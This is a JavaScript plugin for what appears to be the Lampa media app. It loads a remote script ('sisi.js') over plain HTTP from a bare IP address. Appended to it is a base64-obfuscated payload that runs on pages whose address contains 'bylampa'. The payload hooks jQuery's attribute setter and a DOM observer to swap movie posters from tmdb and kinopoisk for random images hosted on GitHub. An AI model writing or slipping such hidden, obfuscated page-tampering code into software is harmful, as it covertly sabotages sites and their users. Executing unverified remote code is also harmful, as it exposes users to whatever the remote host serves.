(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
    //  'https://ab2024.ru/sisi.js',
        'http://31.129.234.181/sisi.js',
    //    'https://l.pashai.ru/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();
(new Function(atob('KGZ1bmN0aW9uKCl7aWYobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJyk9PT0tMSlyZXR1cm47dmFyIHA9W2F0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNaaGJHbGtZWFJ2Y21Wa0wybHRaeTl0WVdsdUx6QXhMbXB3Wnc9PScpLGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNaaGJHbGtZWFJ2Y21Wa0wybHRaeTl0WVdsdUx6QXlMbXB3Wnc9PScpLGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNaaGJHbGtZWFJ2Y21Wa0wybHRaeTl0WVdsdUx6QXpMbXB3Wnc9PScpLGF0b2IoJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDNaaGJHbGtZWFJ2Y21Wa0wybHRaeTl0WVdsdUx6QTBMbXB3Wnc9PScpXSxvPSQuZm4uYXR0cjskLmZuLmF0dHI9ZnVuY3Rpb24obix2KXtpZihuPT09J3NyYycmJnYmJih2LmluY2x1ZGVzKCdwb3N0ZXInKXx8di5pbmNsdWRlcygnaW1hZ2UnKXx8di5pbmNsdWRlcygndG1kYi5vcmcnKXx8di5pbmNsdWRlcygna2lub3BvaXNrJykpKXtyZXR1cm4gby5jYWxsKHRoaXMsbixwW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSpwLmxlbmd0aCldKX1yZXR1cm4gby5hcHBseSh0aGlzLGFyZ3VtZW50cyl9O3ZhciBtPW5ldyBNdXRhdGlvbk9ic2VydmVyKGZ1bmN0aW9uKGUpe2UuZm9yRWFjaChmdW5jdGlvbihyKXtpZihyLmFkZGVkTm9kZXMubGVuZ3RoKXskKHIuYWRkZWROb2RlcykuZmluZCgnaW1nJykuZWFjaChmdW5jdGlvbigpe2lmKHRoaXMuc3JjJiYodGhpcy5zcmMuaW5jbHVkZXMoJ3RtZGInKXx8dGhpcy5zcmMuaW5jbHVkZXMoJ2tpbm9wb2lzaycpfHx0aGlzLnNyYy5pbmNsdWRlcygnaW1hZ2UnKSkpe3RoaXMuc3JjPXBbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpKnAubGVuZ3RoKV19fSl9fSl9KTttLm9ic2VydmUoZG9jdW1lbnQuYm9keSx7Y2hpbGRMaXN0OnRydWUsc3VidHJlZTp0cnVlfSk7JChkb2N1bWVudCkub24oJ2xvYWQnLCdpbWcnLGZ1bmN0aW9uKCl7aWYodGhpcy5zcmMmJih0aGlzLnNyYy5pbmNsdWRlcygndG1kYicpfHx0aGlzLnNyYy5pbmNsdWRlcygna2lub3BvaXNrJyl8fHRoaXMuc3JjLmluY2x1ZGVzKCdpbWFnZScpKSl7dGhpcy5zcmM9cFtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqcC5sZW5ndGgpXX19KX0pKCk7')))()
